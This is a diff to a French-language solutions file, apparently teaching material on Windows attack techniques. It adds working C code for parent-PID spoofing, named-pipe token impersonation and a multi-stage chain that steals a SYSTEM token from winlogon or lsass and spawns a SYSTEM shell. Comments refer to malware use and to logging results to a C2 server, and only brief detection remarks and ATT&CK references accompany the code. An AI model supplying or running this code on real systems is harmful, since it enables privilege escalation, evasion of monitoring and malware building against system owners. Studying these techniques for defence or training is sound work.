-1. Toujours fermer les handles (CloseHandle)
-2. Vérifier les codes d'erreur avec GetLastError()
-3. Gérer correctement la mémoire
-4. Documenter les opérations sensibles
-5. Respecter le cadre légal
-
-Pour aller plus loin :
-- Windows Internals (Russinovich et al.)
-- MITRE ATT&CK Framework
-- Documentation Microsoft Security
-- Windows Security Blog
-
-═══════════════════════════════════════════════════════════════════
+
+SOLUTION 6 : PARENT PID SPOOFING
+
+PPID spoofing :
+STARTUPINFOEX siex;
+SIZE_T size;
+ZeroMemory(&siex, sizeof(siex));
+siex.StartupInfo.cb = sizeof(STARTUPINFOEX);
+
+// Initialiser attribute list
+InitializeProcThreadAttributeList(NULL, 1, 0, &size);
+siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
+InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);
+
+// Trouver parent légitime (explorer.exe)
+HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
+
+UpdateProcThreadAttribute(siex.lpAttributeList, 0,
+                          PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                          &hParent, sizeof(HANDLE), NULL, NULL);
+
+CreateProcessW(NULL, L"cmd.exe", NULL, NULL, FALSE,
+               CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
+               NULL, NULL, &siex.StartupInfo, &pi);
+
+Détection : Process Explorer/Process Hacker verra parent forgé
+
+
+SOLUTION 7 : NAMED PIPE IMPERSONATION
+
+Créer named pipe :
+HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\malicious",
+                                 PIPE_ACCESS_DUPLEX,
+                                 PIPE_TYPE_BYTE | PIPE_WAIT,
+                                 1, 0, 0, 0, NULL);
+
+ConnectNamedPipe(hPipe, NULL);  // Attendre connexion
+
+// Client se connecte (depuis autre processus/user)
+// Dans malware : déclencher connexion d'admin/SYSTEM process
+
+ImpersonateNamedPipeClient(hPipe);
+
+// Maintenant thread a token du client
+HANDLE hToken;
+OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
+
+// Dupliquer token pour persistence
+HANDLE hPrimaryToken;
+DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+                 SecurityImpersonation, TokenPrimary, &hPrimaryToken);
+
+// Spawn process avec token volé
+CreateProcessWithTokenW(hPrimaryToken, 0, NULL, L"cmd.exe", ...);
+
+
+SOLUTION 8 : TOKEN MANIPULATION MULTI-STAGE
+
+Chaîne complète :
+
+// Stage 1: Enable SeDebugPrivilege
+HANDLE hToken;
+OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+enable_privilege(hToken, SE_DEBUG_NAME);
+
+// Stage 2: Find SYSTEM process
+DWORD system_pid = find_process("winlogon.exe");
+if (!system_pid) system_pid = find_process("lsass.exe");
+
+// Stage 3: Steal token
+HANDLE hSystemToken = steal_token(system_pid);
+
+// Stage 4: Verify token (SYSTEM integrity)
+verify_integrity_level(hSystemToken);  // Should be 0x3000
+
+// Stage 5: Spawn SYSTEM shell
+STARTUPINFOW si;
+PROCESS_INFORMATION pi;
+CreateProcessWithTokenW(hSystemToken, 0, NULL, L"cmd.exe",
+                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+// Stage 6: Logging
+log_to_file("Token manipulation successful");
+log_to_c2("SYSTEM shell spawned PID %d", pi.dwProcessId);
+
+// Stage 7: Cleanup
+CloseHandle(hSystemToken);
+CloseHandle(hToken);
+
+
+RÉFÉRENCES :
+- MITRE ATT&CK T1134 (Access Token Manipulation)
+- Windows Internals (Russinovich, Solomon, Ionescu)
+- Mimikatz token manipulation techniques
+- CreateProcessWithTokenW MSDN documentation
+- Sysmon Event ID 10 (ProcessAccess monitoring)
